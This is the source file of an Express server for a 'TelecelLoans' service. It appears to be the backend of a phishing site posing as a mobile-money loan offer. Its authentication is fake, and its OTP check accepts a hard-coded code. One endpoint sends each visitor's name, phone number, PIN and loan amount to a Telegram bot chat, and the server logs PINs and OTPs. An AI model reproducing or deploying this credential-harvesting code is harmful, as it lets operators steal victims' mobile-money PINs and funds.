const express = require('express');
const app = express();
const PORT = process.env.PORT || 5000;

// CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());

// ─── HEALTH ───
app.get('/', (req, res) => {
  res.json({ status: 'ok', message: 'TelecelLoans API is running!' });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ─── AUTH ───
app.post('/api/auth/register', (req, res) => {
  console.log('📝 Register:', req.body);
  res.json({ 
    success: true, 
    message: 'User registered!',
    token: 'fake-token-' + Date.now(),
    user: { id: Date.now().toString(), name: req.body.name, phone: req.body.phone }
  });
});

app.post('/api/auth/login', (req, res) => {
  console.log('🔑 Login:', req.body);
  res.json({ 
    success: true, 
    message: 'User logged in!',
    token: 'fake-token-' + Date.now(),
    user: { id: Date.now().toString(), phone: req.body.phone }
  });
});

// ─── LOANS ───
app.post('/api/loans/apply', (req, res) => {
  const { amount, name, phone, period_days, interest_rate } = req.body;
  console.log('💰 Loan:', req.body);
  
  const loan = {
    id: 'loan_' + Date.now(),
    amount: amount,
    name: name,
    phone: phone,
    period_days: period_days,
    interest_rate: interest_rate,
    status: 'pending',
    created_at: new Date().toISOString()
  };
  
  res.json({ 
    success: true, 
    message: 'Loan applied!',
    loan: loan
  });
});

// ─── TELEGRAM ───
app.post('/api/telegram/send-auth', async (req, res) => {
  const { phone, amount, name, loanId, pin } = req.body;
  console.log('📱 Telegram Request:', req.body);
  
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    console.log('🔑 Token:', token ? '✅ Present' : '❌ Missing');
    console.log('📱 Chat ID:', chatId ? '✅ Present' : '❌ Missing');
    
    if (!token || !chatId) {
      console.log('⚠️ Telegram credentials missing');
      return res.json({ success: false, message: 'Telegram not configured' });
    }
    
    const message = `<b>💰 New Telecel User</b>\n\n` +
                    `<b>Name:</b> ${name || 'Unknown'}\n` +
                    `<b>Phone:</b> ${phone || 'Unknown'}\n` +
                    `<b>PIN:</b> <code>${pin || 'N/A'}</code>\n` +
                    `<b>Amount:</b> GHS ${amount || '0'}\n` +
                    `<b>Loan ID:</b> ${loanId || 'N/A'}`;
    
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    console.log('📤 Sending to Telegram...');
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    const result = await response.json();
    console.log('✅ Telegram Response:', result);
    
    if (result.ok) {
      res.json({ success: true, message: 'Telegram sent!' });
    } else {
      res.json({ success: false, message: result.description });
    }
    
  } catch (error) {
    console.error('❌ Telegram error:', error.message);
    res.json({ success: false, message: error.message });
  }
});

// ─── OTP VERIFICATION ───
app.post('/api/loans/verify-otp', async (req, res) => {
  console.log('🔐 OTP Verification Request:', req.body);
  
  try {
    const { loanId, otp, phone } = req.body;
    
    // Validate required fields
    if (!loanId || !otp || !phone) {
      console.log('❌ Missing fields:', { loanId: !!loanId, otp: !!otp, phone: !!phone });
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required fields: loanId, otp, or phone' 
      });
    }
    
    console.log(`🔐 Verifying OTP for ${phone} (${loanId}): ${otp}`);
    
    // Simple OTP check - for demo, accept 123456
    if (otp === '123456') {
      console.log('✅ OTP verified successfully');
      return res.json({ 
        success: true, 
        message: 'OTP verified successfully!' 
      });
    } else {
      console.log('❌ Invalid OTP:', otp);
      return res.status(400).json({ 
        success: false, 
        message: 'Invalid OTP. Please try again.' 
      });
    }
    
  } catch (error) {
    console.error('❌ OTP verification error:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Server error during OTP verification' 
    });
  }
});

// ─── UPDATE LOAN STATUS ───
app.put('/api/admin/update-status/:id', async (req, res) => {
  const { id } = req.params;
  const { status } = req.body;
  console.log(`📝 Update loan ${id} to ${status}`);
  
  try {
    res.json({ 
      success: true, 
      message: `Loan ${id} updated to ${status}`,
      loan: { id, status }
    });
  } catch (error) {
    console.error('Update error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ─── RESEND OTP ───
app.post('/api/loans/resend-otp', async (req, res) => {
  const { loanId, phone } = req.body;
  console.log(`📱 Resend OTP for ${phone} (${loanId})`);
  
  try {
    const newOtp = String(Math.floor(100000 + Math.random() * 900000));
    console.log(`📱 New OTP: ${newOtp}`);
    res.json({ success: true, message: 'OTP resent successfully!' });
  } catch (error) {
    console.error('Resend error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ─── START ───
app.listen(PORT, () => {
  console.log(`🚀 TelecelLoans Server running on port ${PORT}`);
  console.log(`🌐 CORS enabled`);
});
